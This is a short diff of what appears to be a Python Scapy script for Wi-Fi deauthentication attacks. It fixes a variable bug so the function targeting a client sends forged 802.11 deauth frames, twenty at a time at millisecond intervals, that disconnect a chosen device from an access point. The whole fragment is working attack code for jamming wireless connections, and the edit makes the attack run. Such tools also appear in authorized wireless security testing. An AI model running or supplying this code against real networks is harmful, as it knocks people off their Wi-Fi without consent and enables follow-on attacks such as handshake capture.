@@ -16,5 +16,5 @@ def craft_deauth_attack_to_AP(AP_MAC):
     sendp(pkt, iface = interface, count = 20, inter= .001)
 
 def craft_deauth_attack_to_client(target, AP_MAC):
-    pkt = RadioTap()/Dot11(addr1=Victim_MAC, addr2=AP_MAC, addr3=AP_MAC)/Dot11Deauth()
+    pkt = RadioTap()/Dot11(addr1=target, addr2=AP_MAC, addr3=AP_MAC)/Dot11Deauth()
     sendp(pkt, iface = interface, count = 20, inter= .001)
